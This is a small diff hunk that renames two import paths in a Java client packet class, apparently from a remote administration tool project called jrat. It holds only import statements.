@@ -1,7 +1,7 @@
 package jrat.client.packets.outgoing;
 
-import io.jrat.common.ProcessData;
-import io.jrat.common.io.StringWriter;
+import jrat.common.ProcessData;
+import jrat.common.io.StringWriter;
 import java.io.ByteArrayOutputStream;
 import java.io.DataOutputStream;
 import javax.imageio.ImageIO;
